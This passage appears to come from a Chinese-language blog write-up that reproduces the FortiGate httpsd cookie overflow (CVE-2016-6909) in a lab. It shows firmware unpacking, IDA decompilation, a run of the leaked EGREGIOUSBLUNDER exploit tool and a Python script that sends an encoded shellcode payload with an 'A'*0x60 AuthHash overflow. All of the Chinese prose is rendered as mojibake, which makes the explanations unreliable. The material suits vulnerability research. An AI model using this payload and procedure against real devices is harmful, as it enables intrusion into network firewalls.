class="hljs-number">0</span>;<br>    &#125;<br>LABEL_21:<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;decompress init failed&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  v12[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/sbin/ftar&quot;</span>;<br>  v12[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-xf&quot;</span>;<br>  v12[<span class="hljs-number">2</span>] = name;<br>  v12[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<br>  execv(<span class="hljs-string">&quot;/sbin/ftar&quot;</span>, v12);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ÊïÖ init ËøõÁ®ãÂàÜÊûêÂ¶Ç‰∏ãÔºö</p>
<ul>
<li>Ê£ÄÊü• <code>/bin.tar.xz</code> ÊòØÂê¶Â≠òÂú®ÔºåËã•ÊòØÂàôÂàõÂª∫Â≠êËøõÁ®ãÊâßË°å <code>/sbin/xz --check=sha256 -d /bin.tar.xz</code>ÔºåÁà∂ËøõÁ®ãÁ≠âÂæÖÂ≠êËøõÁ®ãÁªìÊùüÂêéÂà†Èô§<code>/bin.tar.xz</code>Ôºå‰πãÂêéÊ£ÄÊü• <code>/bin.tar</code> ÊòØÂê¶Â≠òÂú®ÔºåËã•ÊòØÂàôÂàõÂª∫Â≠êËøõÁ®ãÊâßË°å <code>/sbin/ftar -xf /bin.tar</code>ÔºåÁà∂ËøõÁ®ãÁ≠âÂæÖÂ≠êËøõÁ®ãÁªìÊùüÂêéÂà†Èô§<code>/bin.tar</code></li>
<li>‰∏ä‰∏ÄÊ≠•ÊàêÂäüÂêéÊ£ÄÊü• <code>/migadmin.tar.xz</code> ÊòØÂê¶Â≠òÂú®ÔºåËã•ÊòØÂàôÂàõÂª∫Â≠êËøõÁ®ãÊâßË°å <code>/sbin/xz --check=sha256 -d /migadmin.tar.xz</code>ÔºåÁà∂ËøõÁ®ãÁ≠âÂæÖÂ≠êËøõÁ®ãÁªìÊùüÂêéÂà†Èô§<code>/migadmin.tar.xz</code>Ôºå‰πãÂêéÊ£ÄÊü• <code>/migadmin.tar</code> ÊòØÂê¶Â≠òÂú®ÔºåËã•ÊòØÂàôÂàõÂª∫Â≠êËøõÁ®ãÊâßË°å <code>/sbin/ftar -xf /migadmin.tar</code>ÔºåÁà∂ËøõÁ®ãÁ≠âÂæÖÂ≠êËøõÁ®ãÁªìÊùüÂêéÂà†Èô§<code>/migadmin.tar</code></li>
<li>Âà†Èô§ <code>/sbin/xz</code></li>
<li>Âà†Èô§ <code>/sbin/ftar</code></li>
<li>ÊâßË°å <code>/bin/init</code></li>
</ul>
<p>Áî±‰∫é <code>ftar</code> ‰∏é <code>xz</code> ÈÉΩÊåáÂÆö‰∫ÜË∞ÉÁî®ÁöÑÂ∫ìÁöÑÁõÆÂΩïÂ¶Ç‰∏ãÔºö</p>
<p><img src="https://i.loli.net/2021/08/11/4exwH7Pkgh5JdGE.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ÊïÖÈúÄË¶ÅÈÄöËøáÂàáÊç¢Ê†πÁõÆÂΩïÊâßË°åËøõË°åËß£ÂéãÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chroot</span> . /sbin/xz --check=sha256 -d /bin.tar.xz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chroot</span> . /sbin/ftar -xf /bin.tar</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chroot</span> . /sbin/xz --check=sha256 -d /migadmin.tar.xz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chroot</span> . /sbin/ftar -xf /migadmin.tar</span><br></code></pre></td></tr></table></figure>

<h3 id="II-bin-ÁõÆÂΩïÊñá‰ª∂ÂàÜÊûê"><a href="#II-bin-ÁõÆÂΩïÊñá‰ª∂ÂàÜÊûê" class="headerlink" title="II. bin ÁõÆÂΩïÊñá‰ª∂ÂàÜÊûê"></a>II. bin ÁõÆÂΩïÊñá‰ª∂ÂàÜÊûê</h3><p>Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞ÁöÑÊòØÔºå<code>bin.tar.xz</code> Ëß£ÂéãÂá∫Êù•ÁöÑÊñá‰ª∂Âü∫Êú¨‰∏äÈÉΩÊòØÊåáÂêë <code>/bin/init</code> ‰∏é <code>/bin/sysctl</code> ÁöÑËΩØÈìæÊé•</p>
<p>ÂÖ∂‰∏≠ËØ∏Â¶Ç <code>httpsd</code> Á≠âÁΩëÁªúÊúçÂä°ÈÉΩÊòØÂâçËÄÖÁöÑËΩØÈìæÊé•ÔºåÂèØÁü•ÂâçËÄÖÂ∫îÂΩì‰∏∫ËØ•Èò≤ÁÅ´Â¢ôÊèê‰æõÁöÑÂü∫Êú¨ÁöÑÁΩëÁªúÊúçÂä°</p>
<p>ËÄåËØ∏Â¶Ç <code>chmod</code> Á≠âÂ∏∏Áî®ÂëΩ‰ª§ÈÉΩÊòØÂêéËÄÖÁöÑËΩØÈìæÊé•ÔºåÂèØÁü•ÂêéËÄÖÂ∫îÂΩì‰∏∫Á±ª‰ºº busybox ‰∏ÄÊ†∑ÁöÑÂ∑•ÂÖ∑Â∫ìÔºå‰∏çËøáÊõ¥‰∏∫Á≤æÁÆÄ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ll</span><br>total 31200<br>drwxr-xr-x  2 root     root         4096 Aug 10 19:35 ./<br>drwxr-xr-x 12 arttnba3 arttnba3     4096 Aug 10 19:37 ../<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 adsl_mon -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 alarmd -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 alertmail -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 authd -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 bgpd -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cardctl -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cardmgr -&gt; /bin/init<br>lrwxrwxrwx  1 root     root           11 Aug 10 19:35 cat -&gt; /bin/sysctl<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cauploadd -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chassis5000d -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chassisd -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chat -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chlbd -&gt; /bin/init<br>lrwxrwxrwx  1 root     root           11 Aug 10 19:35 chmod -&gt; /bin/sysctl<br>...<br></code></pre></td></tr></table></figure>

<h3 id="III-x2F-bin-x2F-init-ÈÄÜÂêëÂàÜÊûê"><a href="#III-x2F-bin-x2F-init-ÈÄÜÂêëÂàÜÊûê" class="headerlink" title="III. &#x2F;bin&#x2F;init ÈÄÜÂêëÂàÜÊûê"></a>III. &#x2F;bin&#x2F;init ÈÄÜÂêëÂàÜÊûê</h3><p>ÊãñÂÖ• IDA ËøõË°åÂàÜÊûêÔºö</p>
<p>È¶ñÂÖà‰ºöÊâßË°å <code>/bin/initXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</code> ÊõøÊç¢Ëá™Ë∫´ÔºåËØ•Êñá‰ª∂ÂÖ∂ÂÆûÊòØ <code>/bin/init</code> ÁöÑËΩØÈìæÊé•ÔºåÊïÖËøôÈáåÊú¨Ë¥®‰∏äÂè™ÊòØÊõ¥Êîπ‰∫Ü pid ‰∏é argv[0]</p>
<p>ÈöèÂêé‰ºöÂÖ≥Èó≠‰∏â‰∏™Ê†áÂáÜÊñá‰ª∂ÊèèËø∞Á¨¶Âπ∂ÊîπÂèòÂΩìÂâçÂ∑•‰ΩúÁõÆÂΩï‰∏∫ <code>/</code>ÔºåÊâìÂºÄ <code>/dev/null</code> Âπ∂ÂàõÂª∫‰∏â‰∏™ÊåáÂêëÂÖ∂ÁöÑÊñá‰ª∂ÊèèËø∞Á¨¶Ôºà0„ÄÅ1„ÄÅ2Ôºâ</p>
<blockquote>
<p>Á¨îËÄÖÂêéÁª≠ÊõæÁªè‰∏ÄÂ∫¶ËÆ§‰∏∫Âà©Áî®Â§±Ë¥•Â∞±ÊòØÂõ†‰∏∫Ê≤°ÊúâÊ≥®ÊÑèÂà∞ËæìÂÖ•ËæìÂá∫Ë¢´ÈáçÂÆöÂêëËá≥ null ËÄåÊó†Ê≥ïÂú®Â±èÂπï‰∏äÊâìÂç∞Âá∫‰ªª‰Ωï‰ø°ÊÅØ</p>
</blockquote>
<p><img src="https://i.loli.net/2021/08/11/vB5HUkGSR67P9yi.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ÂêØÂä®ÂêéÁöÑÁïåÈù¢Â¶Ç‰∏ãÔºö</p>
<p><img src="https://i.loli.net/2021/08/11/pRVcK5Z1szT2uU3.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>È¶ñÂÖà‰∏∫Êàë‰ª¨ÁöÑËôöÊãüÊú∫ÈÖçÁΩÆ‰∏Ä‰∏™Êú¨Âú∞ ip</p>
<p><img src="https://i.loli.net/2021/08/11/YzTN9P82sJiaBFc.png" srcset="/img/loading.gif" lazyload alt="4M4_Z96@_NSPZR087A2_6QC.png"></p>
<p>Êé•‰∏ãÊù•Êàë‰ª¨ËøòÈúÄË¶ÅËé∑ÂèñÂà∞‰∏Ä‰∏™ cookie numÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -X HEAD -v http://192.168.116.100/login  2&gt;&amp;1 | grep <span class="hljs-string">&#x27;APSCOOKIE&#x27;</span></span><br>&lt; Set-Cookie: APSCOOKIE_3943997904=0&amp;0; path=/; expires=Tue, 24-Aug-1971 18:40:48 GMT<br></code></pre></td></tr></table></figure>

<p>‰πãÂêé‰ΩøÁî® <code>egregiousblunder</code> ÊµãËØïËØ•ÊºèÊ¥ûÔºåÂ¶Ç‰∏ãÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./egregiousblunder_3.0.0.1 -t 192.168.116.100 -p 80 -l 4444 --ssl 0 --nope --gen 4nc --config EGBL.config --cookienum 3943997904 --stack 0xbffff114</span><br>loading nopen over HTTP<br>using stack addr 0xbffff114<br>built authhash len 116<br>built enc_authhash with len 116<br>problem recv&#x27;ing ack1/hello, stack address probably wrong.  WAM might work?<br>problem with sending file<br>failure loading nopen over HTTP<br></code></pre></td></tr></table></figure>

<p>Ê≠§Êó∂Âú® fortigate ÁöÑ CLI ‰∏≠Êàë‰ª¨‰æøÂèØ‰ª•ÁúãÂà∞ httpsd ÊúçÂä°ÁöÑÂ¥©Ê∫É‰ø°ÊÅØÂèäÊ†àÂõûÊ∫Ø</p>
<p><img src="https://i.loli.net/2021/08/11/fOPSQBG2elVkKja.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>‰ΩÜÊòØËøôÈáåÊ≤°ËÉΩÂ§üÊàêÂäüËé∑Âæó‰∏Ä‰∏™ shellÔºåÂàùÊ≠•ÁåúÊµãÊòØ EGREGIOUSBLUNDER ÁöÑÁâàÊú¨ÈóÆÈ¢ò</p>
<p>‰ΩøÁî® wireshark Êà™Âèñ EGREGIOUSBLUNDER ÊâÄÂèëÈÄÅÁöÑÊï∞ÊçÆÂåÖËøõË°åÂàÜÊûêÔºåÊàë‰ª¨ÂèØ‰ª•ÂèëÁé∞ <code>0xbffff114</code> Ëøô‰∏™Âú∞ÂùÄË¢´Â∏ÉÁΩÆÂà∞‰∫ÜhttpËØ∑Ê±ÇÂ§¥ÁöÑ Cookie ‰∏≠ÁöÑ <code>AuthHash</code> Â≠óÊÆµÔºåÂàùÊ≠•Êé®ÊµãËøôÂ∫îÂΩìÊòØ‰Ωú‰∏∫‰∏Ä‰∏™ËøîÂõûÂú∞ÂùÄË¢´Â∏ÉÁΩÆ‰∏äÂéªÁöÑÔºåËØ¥ÊòéÂèØËÉΩÊòØ‰∏Ä‰∏™Ê†àÊ∫¢Âá∫ÊºèÊ¥ûÔºåËøô‰πü‰∏é CVE ÈÄöÂëäÊâÄËØ¥ÁöÑ„Äêcookie Ëß£ÊûêËøáÁ®ã‰∏≠ÂèëÁîüÁºìÂÜ≤Âå∫Ê∫¢Âá∫„ÄëÁõ∏ÂêªÂêà</p>
<p><img src="https://i.loli.net/2021/08/12/nKClEmcT15JAQot.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>‰ΩøÁî® postman ÁÆÄÂçï‰ªøÈÄ†ËØ• http ËØ∑Ê±ÇÂ¶Ç‰∏ãÔºå‰ΩøÁî®Â≠óÁ¨¶ <code>A</code> ÁÆÄÂçïÂ°´ÂÖÖ AuthHash Â≠óÊÆµÔºö</p>
<p><img src="https://i.loli.net/2021/08/12/XetkB3iWlKNaqjg.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ÂΩìÊàë‰ª¨ÁöÑÂ≠óÁ¨¶ A Êï∞ÈáèËææÂà∞ 0x60 Êó∂ÂÜç‰∏ÄÊ¨°ÂèëÁîü‰∫Ü crashÔºå‰∏çËøáËøô‰∏ÄÊ¨°ÁöÑÊ†àÂõûÊ∫ØÊõ¥‰∏∫ËØ¶ÁªÜ</p>
<p><img src="https://i.loli.net/2021/08/12/ZHqku5i3BED8QlR.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>‰∏∫‰∫ÜÊñπ‰æøÊûÑÈÄ† payload ËøõË°åÂà©Áî®ÔºåÊé•‰∏ãÊù•Á¨îËÄÖÈÄâÊã©‰ΩøÁî® python ÂèëÈÄÅ http ËØ∑Ê±Ç</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> requests <span class="hljs-keyword">import</span> *<br>url = <span class="hljs-string">&#x27;http://192.168.116.100/index&#x27;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/json&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Length&#x27;</span>:<span class="hljs-string">&#x27;12&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;*/*&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>:<span class="hljs-string">&#x27;gzip,deflate,br&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;PostmanRuntime/7.28.3&#x27;</span>, <br>    <span class="hljs-string">&#x27;Host&#x27;</span>:<span class="hljs-string">&#x27;192.168.116.100&#x27;</span>, <br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&#x27;APSCOOKIE_3943997904=Era=0&amp;Payload=√´Y√ø√°√®√∏√ø√ø√øPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&amp;AuthHash=&#x27;</span> + <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x60</span><br>    &#125;<br><br>r = post(url, headers = headers)<br><span class="hljs-built_in">print</span>(r.text)<br><span class="hljs-built_in">print</span>(r.headers)<br></code></pre></td></tr></table></figure>

<h2 id="ÂÆö‰ΩçÊ∫¢Âá∫ÁÇπ"><a href="#ÂÆö‰ΩçÊ∫¢Âá∫ÁÇπ" class="headerlink" title="ÂÆö‰ΩçÊ∫¢Âá∫ÁÇπ"></a>ÂÆö‰ΩçÊ∫¢Âá∫ÁÇπ</h2><blockquote>
<p>Áî±‰∫é‰∏Ä‰∫õÁâπÊÆäÂéüÂõ†ÔºåÁ¨îËÄÖÊú¨Âú∞Êó†Ê≥ïÁõ¥Êé•ÂêØÂä®ÂÖ∂ init Á®ãÂ∫è</p>
<p>Á¨îËÄÖÊú¨ÊÉ≥Â∞Ü gdb Á≠âÊâìÂåÖËøõÂÖ∂Êñá‰ª∂Á≥ªÁªü‰∏≠Áõ¥Êé•Âú®ËôöÊãüÊú∫ÂÜÖËøõË°åË∞ÉËØïÔºåÂ•à‰ΩïÊñá‰ª∂Á≥ªÁªüÂÆûÂú®Â§™ËÄÅÔºåÈáçÊâìÂåÖÂêéÊ≤°Êúâ‰∏ÄÊ¨°ÂêØÂä®ÊàêÂäüÁöÑÔºåÂè™Â•Ω‰ΩúÁΩ¢‚Ä¶</p>
</blockquote>
<p>Êàë‰ª¨È¶ñÂÖàÊ†πÊçÆËøô‰∏™Êä•Èîô‰ø°ÊÅØËøõË°åÊ†àÂõûÊ∫ØÔºö</p>
<p><img src="https://i.loli.net/2021/08/12/ZHqku5i3BED8QlR.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:08C38A77                 call    sub_8C389B7<br>.text:08C38A7C                 mov     ebx, [ebp+var_4]<br>.text:08C38A7F                 leave<br>.text:08C38A80                 retn<br>.text:08C38A80 sub_8C38A61     endp<br></code></pre></td></tr></table></figure>

<p>ÊâæÂà∞ <code>sub_8C389B7()</code> ÂáΩÊï∞ÔºåÊàë‰ª¨ÂèëÁé∞ÂÖ∂ÊúÄÁªà‰ºöË∞ÉÁî® <code>sub_8C38440()</code> ÂáΩÊï∞ÔºåÁÆÄÂçïÂàÜÊûêÊàë‰ª¨‰∏çÈöæÁü•ÈÅìËØ•Ë∞ÉÁî®Èìæ‰ªÖ‰ªÖÊòØÁî®‰∫éÊâìÂç∞Êä•Èîô‰ø°ÊÅØ</p>
<p><img src="https://i.loli.net/2021/08/12/NYucT3GlibfU8dW.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ÁªßÁª≠ÂàÜÊûêÂÖ∂Ë∞ÉÁî®ÈìæÔºålibc offset 0x1d218 Â§Ñ‰ª£Á†ÅÂ¶Ç‰∏ãÔºåËØ•ÊÆµ‰ª£Á†Å‰Ωç‰∫é libc ‰∏≠ÂáΩÊï∞ <code>__libc_sigaction()</code>ÔºåÁî®‰ª•ËøõË°å <code>sigreturn</code> Á≥ªÁªüË∞ÉÁî®Ôºö</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0001D210 loc_1D210:                              ; DATA XREF: __libc_sigaction+CA‚Üìo<br>.text:0001D210                 mov     eax, 0ADh<br>.text:0001D215                 int     80h             ; LINUX - sys_rt_sigreturn<br>.text:0001D217                 nop<br>.text:0001D218 loc_1D218:                              ; DATA XREF: __libc_sigaction+D9‚Üìo<br>.text:0001D218                 pop     eax<br>.text:0001D219                 mov     eax, 77h ; &#x27;w&#x27;<br>.text:0001D21E                 int     80h             ; LINUX - sys_sigreturn<br></code></pre></td></tr></table></figure>

<p>ÁªßÁª≠ÂõûÊ∫ØÔºå<code>0x8204F8D</code> ÁöÑ‰∏ä‰∏ÄÊù°Êåá‰ª§Ë∞ÉÁî®‰∫Ü <code>sub_820483B()</code> ÂáΩÊï∞ÔºåÈÄöËøáÈÄÜÂêëÊàë‰ª¨ÂèëÁé∞ËØ•ÂáΩÊï∞‰ºöË∞ÉÁî® <code>sub_820429D()</code>Ôºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_820429D</span><span class="hljs-params">(<span class="hljs-type">int</span> *a1, _BYTE *a2)</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> **v4; <span class="hljs-comment">// edi</span><br>  <span class="hljs-type">int</span> *v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">void</span> *v7; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">void</span> *v8; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> *v11[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br><br>  v10 = sub_83297EE(*a1, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>  <span class="hljs-keyword">if</span> ( a2 || (a2 = (_BYTE *)sub_8329B12(a1[<span class="hljs-number">34</span>], <span class="hljs-string">&quot;Cookie&quot;</span>)) != <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( *a2 )<br>    &#123;<br>      v11[<span class="hljs-number">0</span>] = (<span class="hljs-type">char</span> *)sub_8344CBA(*a1, &amp;a2, <span class="hljs-number">59</span>);<br>      <span class="hljs-keyword">if</span> ( !v11[<span class="hljs-number">0</span>] )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">while</span> ( ((*__ctype_b_loc())[(<span class="hljs-type">unsigned</span> __int8)*a2] &amp; <span class="hljs-number">0x2000</span>) != <span class="hljs-number">0</span> )<br>        ++a2;<br>      v2 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)sub_8344CBA(*a1, v11, <span class="hljs-number">61</span>);<br>      v3 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)sub_8204B9C(a1);<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strstr</span>(v2, v3) )<br>        sub_820CB5E(v11[<span class="hljs-number">0</span>]);<br>...<br></code></pre></td></tr></table></figure>

<p>ÂÖ∂‰∏≠ <code>sub_8329B12()</code> ÂáΩÊï∞Ë∞ÉÁî®‰∫Ü <code>strcasecmp()</code>ÔºåÂ§ßËá¥ÂàÜÊûêÂ∫îÂΩìÊòØÂà§Êñ≠Â≠óÁ¨¶‰∏≤Â≠òÂú®ÊÄßÁöÑÂáΩÊï∞ÔºåÂú®ËøôÈáå‰º†ÂÖ•ÁöÑÂèÇÊï∞‰∏≠ÂåÖÂê´Â≠óÁ¨¶‰∏≤ <code>&quot;Cookie&quot;</code>ÔºåÈÇ£‰πàÊàë‰ª¨Â§ßËá¥ÂèØ‰ª•Êé®ÊµãËØ•ÂáΩÊï∞Â∫îÂΩìÊòØ httpsd ÔºàÂç≥Êú¨ËøõÁ®ãÔºâ‰∏≠Ë¢´Áî®‰ª•Â§ÑÁêÜ Cookie Áõ∏ÂÖ≥ÁöÑÂáΩÊï∞‰πã‰∏Ä</p>
<p>Â±ÄÈÉ®ÂèòÈáè v3 ÁöÑÊ±ÇËß£Ê∂âÂèäÂà∞ÂáΩÊï∞ <code>sub_8204B9C()</code>ÔºåÂ¶Ç‰∏ãÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_8204B9C</span><span class="hljs-params">(_DWORD *a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br><br>  v1 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( nCfg_debug_zone )<br>    v1 = nCfg_debug_zone + <span class="hljs-number">45972</span>;<br>  v2 = sub_8204B37(v1);<br>  <span class="hljs-keyword">return</span> sub_8329797(*a1, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;%s_%lu&quot;</span>, <span class="hljs-string">&quot;APSCOOKIE&quot;</span>, v2);<br>&#125;<br></code></pre></td></tr></table></figure>

